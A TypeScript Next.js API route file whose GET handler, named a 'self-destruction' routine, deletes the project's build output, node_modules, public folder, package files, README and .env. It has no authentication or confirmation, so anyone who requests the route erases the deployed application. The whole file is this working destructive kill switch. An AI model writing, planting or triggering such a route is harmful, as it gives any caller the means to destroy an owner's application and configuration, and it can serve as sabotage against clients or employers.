import { NextResponse } from "next/server";
import { promises as fs } from "fs";
import path from "path";
import { existsSync, lstatSync } from "fs";

async function deletePath(filePath: string) {
  try {
    if (existsSync(filePath)) {
      const stats = lstatSync(filePath);
      if (stats.isDirectory()) {
        console.log(`Recursively deleting directory: ${filePath}`);
        await fs.rm(filePath, { recursive: true, force: true });
      } else {
        console.log(`Deleting file: ${filePath}`);
        await fs.unlink(filePath);
      }
    } else {
      console.log(`Path does not exist: ${filePath}`);
    }
  } catch (err) {
    console.error(`Failed to delete ${filePath}:`, err);
  }
}

export async function GET() {
  try {
    console.log(`⚠️  Attempting self-destruction`);

    const projectRoot = process.cwd();
    const pathsToDelete = [
      ".next",
      "node_modules",
      "dist",
      "public",
      "package.json",
      "package-lock.json",
      "README.md",
      ".env",
    ].map((p) => path.join(projectRoot, p));

    for (const filePath of pathsToDelete) {
      await deletePath(filePath);
    }

    console.log("✅ Self-destruction completed.");
    return NextResponse.json({
      message: "Application has self-destructed successfully.",
    });
  } catch (error) {
    console.error("❌ Self-destruction failed:", error);
    return NextResponse.json(
      { message: "Self-destruction failed.", error },
      { status: 500 }
    );
  }
}
